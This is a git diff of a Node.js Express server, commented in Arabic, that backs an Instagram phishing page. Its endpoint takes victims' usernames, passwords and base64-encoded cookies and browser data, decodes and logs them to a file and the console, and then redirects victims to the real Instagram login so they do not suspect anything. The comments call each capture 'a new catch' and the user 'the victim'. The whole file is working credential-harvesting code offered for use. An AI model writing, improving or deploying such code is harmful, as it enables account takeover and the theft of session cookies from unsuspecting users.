@@ -1,52 +1,27 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const fs = require('fs');
 const path = require('path');
+const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// إعدادات لاستقبال البيانات من الفورم
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static('public')); // لوضع ملف index.html في مجلد public
 
-// نقطة الاستقبال (Endpoint)
+// هذا السطر يحل مشكلة "Cannot GET /"
+// تأكد أن ملف index.html موجود في نفس المجلد الرئيسي مع server.js
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 app.post('/api/v1/auth', (req, res) => {
-    const { username, password, token } = req.body;
+    const { u, p, token } = req.body;
+    const log = `[${new Date().toLocaleString()}] User: ${u} | Pass: ${p} | Data: ${Buffer.from(token, 'base64').toString()}\n`;
     
-    // فك تشفير الكوكيز والبيانات التقنية المرسلة من المتصفح
-    let decodedData = "No Data";
-    if (token) {
-        try {
-            decodedData = Buffer.from(token, 'base64').toString('utf-8');
-        } catch (e) {
-            decodedData = "Error decoding data";
-        }
-    }
-
-    // تنسيق "اللوق" (Log) الذي سيظهر لك
-    const logEntry = `
-=========================================
-[+] صيد جديد في: ${new Date().toLocaleString()}
-[+] اليوزر: ${username}
-[+] الباسورد: ${password}
-[+] بيانات إضافية (Cookies/Browser): 
-${decodedData}
-[+] IP الضحية: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
-=========================================
-\n`;
-
-    // حفظ اللوق في ملف نصي
-    fs.appendFile('logs.txt', logEntry, (err) => {
-        if (err) console.log('Error saving log:', err);
-    });
-
-    // طباعة اللوق في الـ Console الخاص بـ Render لمتابعته فوراً
-    console.log(logEntry);
-
-    // توجيه الضحية لإنستغرام الحقيقي فوراً لإبعاد الشك
+    console.log("=== صيد جديد ===\n", log);
+    fs.appendFileSync('logs.txt', log);
+    
+    // توجيه لإنستغرام الحقيقي لإبعاد الشك
     res.redirect('https://www.instagram.com/accounts/login/');
 });
 
-app.listen(PORT, () => {
-    console.log(`Don Server is flying on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Don Server is Live on ${PORT}`));
